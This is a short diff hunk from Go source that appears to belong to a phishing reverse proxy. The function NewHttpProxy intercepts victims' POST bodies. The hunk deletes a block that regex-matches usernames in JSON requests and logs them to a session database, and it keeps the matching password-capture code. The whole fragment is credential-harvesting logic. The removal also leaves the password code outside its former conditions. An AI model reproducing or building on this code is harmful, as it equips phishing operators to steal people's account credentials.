@@ -433,20 +433,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST body = %s", body)
 
 						contentType := req.Header.Get("Content-type")
-						if contentType == "application/json" {
-
-							if pl.username.tp == "json" {
-								um := pl.username.search.FindStringSubmatch(string(body))
-								if um != nil && len(um) > 1 {
-									p.setSessionUsername(ps.SessionId, um[1])
-									log.Success("[%d] Username: [%s]", ps.Index, um[1])
-									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-										log.Error("database: %v", err)
-									}
-								}
-							}
-
-							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
